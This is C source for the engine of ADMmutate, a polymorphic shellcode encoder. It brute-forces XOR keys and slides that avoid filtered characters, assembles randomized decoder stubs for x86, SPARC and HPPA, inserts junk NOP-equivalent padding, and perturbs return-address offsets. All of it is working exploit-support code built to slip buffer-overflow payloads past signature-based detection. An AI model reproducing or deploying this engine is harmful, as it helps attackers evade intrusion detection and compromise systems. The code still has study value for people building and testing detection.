/* 
   K2,
   ADMmuteng.c, this should provide the base functionality of the engine.
*/
#include <stdio.h>
#if defined(LINUX) || defined(OS5) || defined(TRU64) || defined(BSD)
#include <string.h>
#else
#include <strings.h>
#endif
#include <stdlib.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include "ADMmutapi.h"
#include "ADMmuteng.h"

/* interate through mutate at the location of the shellcode, and code it with a key,
   this can be pretty lenghth, my HPPA 712/60 (60mhz) churns through in about 35-40s */
int apply_key(char *mutant, size_t enc_amount, size_t enc_offset, struct morphctl *mut)
{
   float nkeyslide;
   int i,z,j=0;
   unsigned int lowc=0,highc=0,nslide=1;
   char *workspc, *chrstr = NULL;

   /* diabled API never fail!! */
   if(mut->arch == DISABLE)
      return(0); 
      
   /* we encode 4bytes @ at time */
   if(enc_amount%4)
      enc_amount+=(4-(enc_amount%4));
      
   /* we'll be doing some string operations later... so let's allocate enough space
   for an extra NULL byte */
   workspc = malloc(enc_amount);
   memset(workspc,0,enc_amount);

   if(mut->upper) {
      lowc='a'; highc='z';
      chrstr = mutlowerset;
   }
   if(mut->lower) {
      lowc='A'; highc='Z';
      chrstr = mutupperset;
   }
   
   /* we calculate all possiable key's starting with 0x101 */
   mut->cipher=0x100;
   do
   {
      mut->cipher++;
      j++; z=0;

      /* first off, find out whether our key is allowed */
      if((((mut->cipher >> 8) < (lowc)) || ((mut->cipher >> 8) > (highc))) && ((mut->cipher >> 8) != 0)) {
         if((((mut->cipher & 0xff) < (lowc)) || ((mut->cipher & 0xff) > (highc))) && ((mut->cipher & 0xff) != 0)) {            

            memcpy(workspc,mutant+enc_offset,enc_amount);
            /* test our string (Destructive) 2byte's @ a time */
            mutate_encode(workspc,enc_amount,mut,2);

            if(mut->banned) {
               if(strcspn(workspc,mut->banned) != strlen(workspc))
                  z++;
            }
            if((mut->upper) || (mut->lower)) {
               if(strcspn(workspc,chrstr) != strlen(workspc))
                  z++;
            }
            
            if(strlen(workspc) < enc_amount) /* avoid truncation */
               z++;
            /* let's pray the key's we found are good to go :) */
            if(!z) {
               good_keys[nkeys]=mut->cipher;
               nkeys++;
            }
         }
      }
   } while(j<0x10000);

   if(nkeys==0) {
      free(workspc);
      return(1);      
   }

#ifdef DSRAND
   srand((unsigned int) dsrand(time(0)));
#else      
   srand((unsigned int) time(0));
#endif

   /* two rounds of 16 bit key's TAKE THAT!@#$%!! */
   mut->cipher=good_keys[(rand() % nkeys)];
   mut->cipher2=good_keys[(rand() % nkeys)];

   memcpy(workspc,mutant+enc_offset,enc_amount);

   /* initialize slides */
   mut->slide=0;
   mut->slide2=0;
  
   if(mut->keyslide)
      nslide = mutate_slide(workspc,enc_amount,mut);

   mutate_encode(workspc,enc_amount,mut,4);
  
#ifdef DEBUG
   nkeyslide=(float ) nkeys * (float) nkeys * (float) nslide;
   fprintf(stderr,"NKEYS = [%.8u], NSLIDE = [%.8u], KEY/SLIDE Permutations = [%f], key = [0x%.4x%.4x], slide = [0x%.4x%.4x]\n",nkeys*nkeys,nslide,nkeyslide,mut->cipher,mut->cipher2,mut->slide,mut->slide2);
#endif

#ifdef DEBUG_MORE
   fprintf(stderr,"encoded shellcode [%d] = \n\"",strlen(workspc));
   for(i=0;i<strlen(workspc);i++) {
      fprintf(stderr,"\\x%.2x",(*(workspc+i) & 0xff));
      if(((i+1)%16)==0)
         fprintf(stderr,"\"\n\"");
   }
   fprintf(stderr,"\"\n");
#elif DEBUG
   /* printing out the code as a string was flashing my terminal to bad char set's */
   fprintf(stderr,"encoded shellcode [%s]\n",workspc);
#endif

   /* copy our final code out */
   memcpy(mutant+enc_offset,workspc,enc_amount);
   free(workspc);
   return(0);
}

/* test out an encode, going to start building framework for more encode/decode types
   besides xor */
int mutate_encode(char *workspc, size_t enc_amount, struct morphctl *mut, int step)
{
   unsigned int i,keyx,slidex;

   if(step==2) {
      for(i=0;i< (int ) enc_amount;i+=step) {
         workspc[i]  ^= (mut->cipher >> 8);
         workspc[i+1]^= (mut->cipher & 0xff);
      }
   } else {
      keyx = mut->cipher << 16;
      keyx += mut->cipher2;
      slidex = mut->slide << 16;
      slidex += mut->slide2;

      for(i=0;i<(int) enc_amount;i+=step) {
         if(mut->keyslide) {
            workspc[i+3] ^= (keyx >> 24) & 0xff;
            workspc[i+2] ^= (keyx >> 16) & 0xff;
            workspc[i+1] ^= (keyx >> 8) & 0xff;
            workspc[i]   ^= (keyx >> 0) & 0xff;
            keyx+=slidex;
         } else {
            workspc[i]   ^= (keyx >> 24) & 0xff;
            workspc[i+1] ^= (keyx >> 16) & 0xff;
            workspc[i+2] ^= (keyx >> 8) & 0xff;
            workspc[i+3] ^= (keyx >> 0) & 0xff;
         }
      }
   }
   return(0);
}

/* generate some valid slides */
int mutate_slide(char *workspc, size_t enc_amount, struct morphctl *mut)
{
   unsigned int lowc=0,highc=0,nslide=0;
   int good_slide[1<<16],i,z,j=0;
   char *tmpspc, *chrstr = NULL;
   
   tmpspc=malloc(enc_amount+1);
   memset(tmpspc,0,enc_amount+1);

   if(mut->upper) {
      lowc='a'; highc='z';
      chrstr = mutlowerset;
   }
   if(mut->lower) {
      lowc='A'; highc='Z';
      chrstr = mutupperset;
   }
   
   /* we calculate all possiable key's starting with 0x101
      I really should do this 2x for each slide, right now, if one fails
      I fail both of the slides... maybe later */

   mut->slide=0x100;
   do
   {
      mut->slide++;
      mut->slide2=mut->slide; /* syncronize keys */
      j++; z=0;

      /* first off, find out whether our key is allowed */
      if((((mut->slide >> 8) < (lowc)) || ((mut->slide >> 8) > (highc))) && ((mut->slide >> 8) != 0)) {
         if((((mut->slide & 0xff) < (lowc)) || ((mut->slide & 0xff) > (highc))) && ((mut->slide & 0xff) != 0)) {

            memcpy(tmpspc,workspc,enc_amount);
            mutate_encode(tmpspc,enc_amount,mut,4);

            if(mut->banned) {
               if(strcspn(tmpspc,mut->banned) != strlen(tmpspc))
                  z++;
            }
            if((mut->upper) || (mut->lower)) {
               if(strcspn(tmpspc,chrstr) != strlen(tmpspc))
                  z++;
            }

            if(strlen(tmpspc) < enc_amount) /* avoid truncation */
               z++;
            /* let's pray the key's we found are good to go :) */
            if(!z) {
               good_slide[nslide]=mut->slide;
               nslide++;
            }
         }
      }
   } while(j<0x10000);
   if(nkeys==0) {
      free(tmpspc);
      return(1);
   }

#ifdef DSRAND
   srand((unsigned int) dsrand(time(0)));
#else
   srand((unsigned int) time(0));
#endif

   mut->slide=good_slide[rand() % nslide];
   mut->slide2=good_slide[rand() % nslide];

   return(nslide*nslide);
}
/* 
   this function codes the engine out of the morpheng struct, into the eng_space buffer,
   it also fill's in random junk's.
*/
int apply_engine(char *mutant, size_t enc_amount, size_t eng_pad, struct morphctl mut)
{
   int  i,j,k=0,z=0,zz,zx,zy; /* started useing 2 letter variable names... incase we run out of one letter names */
   size_t len=0,tlen=0;
   char *eng_space,*chrstr = NULL;

   /* diabled API never fail!! */
   if(mut.arch == DISABLE)
      return(0); 

   /* we encode 4bytes @ at time */
   if(enc_amount%4)
      enc_amount+=(4-(enc_amount%4));

   eng_space=malloc((size_t) BUFSIZ);
   memset(eng_space,0,(size_t) BUFSIZ);

#ifdef DSRAND
   srand((unsigned int) dsrand(time(0)));
#else      
   srand((unsigned int) time(0));
#endif

   /* we could just brute force a good list, but I think this is safer */
   if((new = rnd_srt(mut)) == NULL)
      return(2);

   /* fill in the working instructions */
   while(k<mut.decoder_instructions) {
      i=new[k]; k++;
#ifdef DEBUG
      fprintf(stderr,"odr = %d, ",i);
#endif   
      morpheng[i].lentohere = tlen;
      zz=(rand() % morpheng[i].amount);
      zy=(rand() % JMAX);
      
      /* there could be some upper/lower/banned char in the engine itself */
      if((mut.lower) && (morpheng[i].lower))
         zz=((rand() % morpheng[i].lower)+(morpheng[i].amount-morpheng[i].lower));
      else if((mut.upper) && (morpheng[i].upper))
         zz=(rand() % morpheng[i].upper);

      len=strlen(morpheng[i].codez[zz]);
      memcpy((eng_space+tlen),morpheng[i].codez[zz],len);
      tlen += len;

      /* fill in junk's between working instructions */
      if(morpheng[i].padd && (i<(mut.decoder_instructions-1))) {
      for(j=0;j<zy;j++)
       {
         zx=(rand() % mut.junk_pads);
         if(njunk[zx].morph) {
            if((mut.upper && njunk[zx].upper) || (mut.lower && njunk[zx].lower) || (!mut.upper && !mut.lower)) {
               memcpy(eng_space+tlen,njunk[zx].code,njunk[zx].len);
               /* if we loaded a dyn instruction, find a valid int to subst for N */
               if(njunk[zx].dyn) {
                  *(eng_space+tlen+njunk[zx].dynint) = (char) good_keys[(rand() % nkeys)];
                  if(mut.arch == HPPA)
                       *(eng_space+tlen+njunk[zx].dynint) = (char) lo(good_keys[(rand() % nkeys)]);
               }
               tlen+=njunk[zx].len;
            }
         }
       }
     }
   }

   /* Sanity checking!!! */
   
   /* fixup will encode instruction offset's & required constants */
   mutate_fixup(eng_space, enc_amount, tlen, mut);

   /* make sure there was no truncation */
   if(strlen(eng_space) < tlen)
      z++;

   /* do a quick check to ensure no banned char existed in the hardcoded values */
   if(mut.upper) {
      chrstr = mutlowerset;
      if(strcspn(eng_space,chrstr) != strlen(eng_space))
         z++;
   }
   if(mut.lower) {
      chrstr = mutupperset;
      if(strcspn(eng_space,chrstr) != strlen(eng_space))
         z++;
   }
   if(mut.banned) {
      if(strcspn(eng_space,mut.banned) != strlen(eng_space))
         z++;
   } /* make sure we have the space to put our engine in the nop space */
   if(tlen >= eng_pad)
      z++;

#ifdef DEBUG_MORE
   fprintf(stderr,"ENGINE[%d] = \n\"",strlen(eng_space));
   for(i=0;i<strlen(eng_space);i++) {
      fprintf(stderr,"\\x%.2x",(*(eng_space+i) & 0xff));
      if(((i+1)%16)==0)
         fprintf(stderr,"\"\n\"");
   }
   fprintf(stderr,"\"\n");
#elif DEBUG
   fprintf(stderr,"ENGINE = [%d]\n[%s]\n[%d]\n",strlen(eng_space),eng_space,strlen(eng_space));
#endif

   if(z) {
      free(eng_space);
      return(1);
   }
      
   /* copy finalized engine */
   memcpy(mutant+(eng_pad-tlen),eng_space,strlen(eng_space));
   free(eng_space);
   return(0);
}

/* 
   perform offset calculations by hand
   there may be an issue if we generated to large of a decoder
   the offset may need more then one byte of address space(x4), maby fix later
*/
int mutate_fixup(char *eng_space, size_t enc_amount, size_t tlen, struct morphctl mut)
{
   unsigned int zw;
   /* 32bit representation of the 2 16bit key's. */
   zw = mut.cipher << 16;
   zw += mut.cipher2;

   if(mut.arch == IA32) {
            /* set the initial jump to the call back */
      *(eng_space+morpheng[0].lentohere+1) =  (char) (morpheng[12].lentohere-2);
#ifdef DEBUG_MORE
      fprintf(stderr,"HARD CODE [0x%.2x]\n",(char) (morpheng[12].lentohere-2));
#endif      
            /* setup the cipher key */
      *(eng_space+morpheng[2].lentohere+1) = (char) (mut.cipher >> 8);
      *(eng_space+morpheng[2].lentohere+2) = (char) (mut.cipher & 0xff);
      *(eng_space+morpheng[2].lentohere+3) = (char) (mut.cipher2 >> 8);
      *(eng_space+morpheng[2].lentohere+4) = (char) (mut.cipher2 & 0xff);
            /* setup the decode amount */
      *(eng_space+morpheng[4].lentohere+1) = (char) (enc_amount/4);
#ifdef DEBUG_MORE
      fprintf(stderr,"HARD CODE [0x%.2x]\n",(char) (enc_amount/4));
#endif      
            /* setup the loop */
      *(eng_space+morpheng[10].lentohere+1) = (char) ((morpheng[5].lentohere - morpheng[10].lentohere)-2);
#ifdef DEBUG_MORE
      fprintf(stderr,"HARD CODE [0x%.2x]\n",(char) ((morpheng[5].lentohere - morpheng[10].lentohere)-2));
#endif      
            /* setup the jump out into shellcode */
      *(eng_space+morpheng[11].lentohere+1) = (char) ((tlen - morpheng[11].lentohere)-1);
#ifdef DEBUG_MORE
      fprintf(stderr,"HARD CODE [0x%.2x]\n",(char) ((tlen - morpheng[11].lentohere)-1));
#endif      
            /* setup the call back */
      *(eng_space+morpheng[12].lentohere+1) = (char) (morpheng[1].lentohere-(strlen(morpheng[12].codez[0])+morpheng[12].lentohere));
   } else if(mut.arch == IA32_SLIDE) {
            /* set the initial jump to the call back */
      *(eng_space+morpheng[0].lentohere+1) =  (char) (morpheng[13].lentohere-2);
            /* setup the cipher key */
      *(eng_space+morpheng[2].lentohere+4) = (char) (mut.cipher >> 8);
      *(eng_space+morpheng[2].lentohere+3) = (char) (mut.cipher & 0xff);
      *(eng_space+morpheng[2].lentohere+2) = (char) (mut.cipher2 >> 8);
      *(eng_space+morpheng[2].lentohere+1) = (char) (mut.cipher2 & 0xff);
            /* setup the decode amount */
      *(eng_space+morpheng[4].lentohere+1) = (char) (enc_amount/4);
            /* setup the slides */
      *(eng_space+morpheng[6].lentohere+5) = (char) (mut.slide >> 8);
      *(eng_space+morpheng[6].lentohere+4) = (char) (mut.slide & 0xff);
      *(eng_space+morpheng[6].lentohere+3) = (char) (mut.slide2 >> 8);
      *(eng_space+morpheng[6].lentohere+2) = (char) (mut.slide2 & 0xff); 
            /* setup the loop */
      *(eng_space+morpheng[11].lentohere+1) = (char) ((morpheng[5].lentohere - morpheng[11].lentohere)-2);
            /* setup the jump out into shellcode */
      *(eng_space+morpheng[12].lentohere+1) = (char) ((tlen - morpheng[12].lentohere)-1);
            /* setup the call back */
      *(eng_space+morpheng[13].lentohere+1) = (char) (morpheng[1].lentohere-(strlen(morpheng[13].codez[0])+morpheng[13].lentohere));
   } else if(mut.arch == SPARC) {
      *(eng_space+morpheng[5].lentohere+3)  = (char) (morpheng[14].lentohere - morpheng[2].lentohere);
      *(eng_space+morpheng[12].lentohere+3) = (char) (enc_amount/4);
      *(eng_space+morpheng[13].lentohere+3) = (-((morpheng[13].lentohere - morpheng[7].lentohere) / 4) & 0xff);

      /* things are not byte aligned like on CISC's, here is key */
      *(eng_space+morpheng[3].lentohere+1) = (char) ((zw>>26) & 0x3F);
      *(eng_space+morpheng[3].lentohere+2) = (char) ((zw>>18) & 0xFF);
      *(eng_space+morpheng[3].lentohere+3) = (char) ((zw>>10) & 0xFF);

      *(eng_space+morpheng[4].lentohere+2) = (char) (((zw>>8) & 0x03) + 0x60);
      *(eng_space+morpheng[4].lentohere+3) = (char) (zw & 0xFF);

      /* for the bn -xxx */
      *(eng_space+morpheng[0].lentohere+2) = (char) good_keys[(rand() % nkeys)];
      *(eng_space+morpheng[0].lentohere+3) = (char) good_keys[(rand() % nkeys)];
      *(eng_space+morpheng[1].lentohere+2) = (char) good_keys[(rand() % nkeys)];
      *(eng_space+morpheng[1].lentohere+3) = (char) good_keys[(rand() % nkeys)];
   } else if(mut.arch == HPPA) {
      /* encode the ldil */
      *(eng_space+morpheng[0].lentohere+1) = (char) ((hi(zw) >> 16 & 0xff) + 0x60);
      *(eng_space+morpheng[0].lentohere+2) = (char) (hi(zw) >> 8 & 0xff);
      *(eng_space+morpheng[0].lentohere+3) = (char) (hi(zw) & 0xff);
      /* encode the ldo */
      *(eng_space+morpheng[1].lentohere+2) = (char) (lo(zw) >> 8 & 0xff);
      *(eng_space+morpheng[1].lentohere+3) = (char) (lo(zw) & 0xff);

      /* amount to encode */
      *(eng_space+morpheng[3].lentohere+3) = (char) (lo(-enc_amount/4) & 0xff);

      /* offset to shellcode */
      *(eng_space+morpheng[4].lentohere+3) = (char) (lo((tlen - morpheng[5].lentohere)+1)&0xff);
   
      /* decode loop offset */
      *(eng_space+morpheng[9].lentohere+3) = (char) ((((morpheng[5].lentohere - (morpheng[9].lentohere + 4)) << 1) - 3) & 0xff);
   }
   return(0);
}

/* 
   mutate padding nops at beginning of string to a total of njlen
   can handle banned list, adding weighted population support
*/
int apply_jnops(char *mutant, size_t njlen, struct morphctl mut)
{
   int zz,j,k,listjnk=0;
   size_t i=0;
   struct junks listjunk[1024];  /* harlimit sux */

   /* diabled API never fail!! */
   if(mut.arch == DISABLE)
      return(0);

   /* fill list junk with weighted junks */
   for(j=0;j<mut.junk_pads;j++)
   {
      for(k=0;k<njunk[j].weight;k++) {
         listjunk[listjnk++]=njunk[j];
      }
      /* too many, maby make dynamic later */
      if(listjnk>1022)
         return(1);
   }

#ifdef DSRAND
   srand((unsigned int) dsrand(time(0)));
#else
   srand((unsigned int) time(0));
#endif
   do
   {
      zz=(rand() % listjnk);
      if(listjunk[zz].noppad)         /* all of this ensures we follow upper/lower/banned restrictions  */
         if((mut.upper && listjunk[zz].upper) || (mut.lower && listjunk[zz].lower) || (!mut.upper && !mut.lower)) {
            if(((mut.banned) && (strlen(listjunk[zz].code) == strcspn(listjunk[zz].code,mut.banned))) || !mut.banned) {
               memcpy(mutant+i,listjunk[zz].code,listjunk[zz].len);
               if(listjunk[zz].dyn) {
                  *(mutant+i+listjunk[zz].dynint) = (char) good_keys[(rand() % nkeys)];
                  if(mut.arch == HPPA)
                     *(mutant+i+listjunk[zz].dynint) = (char) lo(good_keys[(rand() % nkeys)]);
               }
               i+=listjunk[zz].len;
            }
         }
   } while(i<njlen);
   fprintf(stderr,"%s\n",mutant);
   return(0);
}

/* 
   offset modulation,
   how about we modify +- 255?
   PLZ PLZ PLZ PLZ GIVE ME GOOD OFFSET(place where ret's begin), I will assume you did :)
   PS. This is hazardous :)
*/
int apply_offset_mod(char *mutant, size_t olen, size_t offoff, struct morphctl mut)
{
   int z,lowc=0,highc=0;
   size_t i;
   char *workspc;

   z=(rand() % 0xFF);

   if(mut.upper) {
      lowc='a'; highc='z';
   }
   
   if(mut.lower) {
      lowc='A'; highc='Z';
   }
   
   if(olen == 0)
      return(1);
      
   workspc = malloc(olen);
   memcpy(workspc,mutant+offoff,olen);

#ifdef DEBUG
   fprintf(stderr,"modulate char = 0x%x, modulate + 0x%x\n",workspc[0] & 0xff,z);
#endif
   /* ensure we do not encode too much */
   olen-=(olen%4);
   
   for(i=0;i<olen;i+=4)
   {
     if((mut.upper) || (mut.lower)) {
        while((workspc[i]+z >= lowc) && (workspc[i]+z <= highc)) {
           z++;
        }
     }
     if(mut.banned) {
         while(memchr(mut.banned,workspc[i]+z,strlen(mut.banned))) {
            z++;
         }
      }
      workspc[i] += z;
   }
   memcpy(mutant+offoff,workspc,olen);
   free(workspc);
   return(0);
}

/* this will setup the OS specific shiznat */
int init_mutate(struct morphctl *mut)
{
   switch(mut->arch) {
      case DISABLE:
         morpheng = NULL;
         njunk = NULL;
         mut->decoder_instructions = (int) NULL;
         mut->junk_pads = (int) NULL;
         mut->keyslide=0;
         break;
      case IA32:
         morpheng = intel_morpheng;
         njunk = intel_njunk;
         mut->decoder_instructions = IA32_DECINST;
         mut->junk_pads = IA32_JUNKS;
         mut->keyslide=0;
         break;
      case SPARC:
         morpheng = sparc_morpheng;
         njunk = sparc_njunk;
         mut->decoder_instructions = SPARC_DECINST;
         mut->junk_pads = SPARC_JUNKS;
         mut->keyslide=0;
         break;
       case HPPA:
         morpheng = hppa_morpheng;
         njunk = hppa_njunk;
         mut->decoder_instructions = HPPA_DECINST;
         mut->junk_pads = HPPA_JUNKS;
         mut->keyslide=0;
         break;
       case IA32_SLIDE:
         njunk = intel_njunk;
         mut->junk_pads = IA32_JUNKS;
         morpheng = intel_morpheng_slide;
         mut->decoder_instructions = IA32_DECINST_SLIDE;
         mut->keyslide=1;
         break;
      default:
         return(-1);
   }
   return(0);
}

/* there is probably an easier way todo this */
int *rnd_srt(struct morphctl mut)
{
   int pos[WINT],list1[WINT]; /* LCD width of an int */
   int i,j,k,l;

   /* fill list1 */
   for(i=0;i<mut.decoder_instructions;i++)
   {
      list1[i] = morpheng[i].order;
   }
   /* go through the list */
   for(j=0;j<mut.decoder_instructions;j++)
   {
      k=0;
      /* find all possiables */
      for(i=0;i<mut.decoder_instructions;i++)
      {
         if((1 << j) & list1[i]) {
           pos[k]=i;
           k++;
         } /* if the position is exclusive, break out & set position */
         if((1 << j) == list1[i]) {
            pos[k]=i;
            k=1;
            break;
         }
      }
      /* select a possiable, remove it from the list */
      l=(rand() % k);
      k=rndlist[j]=pos[l];
      list1[k]=0;
      /* remove the position from the list*/
      for(i=0;i<mut.decoder_instructions;i++)
      {
         if((1 << j) & list1[i]) {
            list1[i] -= (1 << j);

            /* we should not be subtracting to 0 */
            if(list1[i] == 0)
            return(NULL);
         }
      }
   }
   return(rndlist);
}

#ifdef DSRAND
unsigned int dsrand(unsigned int seed)
{
   unsigned int seedX;
   seedX = seed + get_count();
   return(seedX);
}
#endif

#ifdef IA32_RND
unsigned int get_count()
{
   __asm__("rdtsc");
}
#endif

/* I dont know for sure if gcc will let you do this :) */
#ifdef SPARCV9_RND
unsigned int get_count()
{
   __asm__("rd %tick,%i0");
}
#endif

#ifdef HPPA_RND
unsigned int get_count()
{
   __asm__("mfctl 16,%r28");
}
#endif
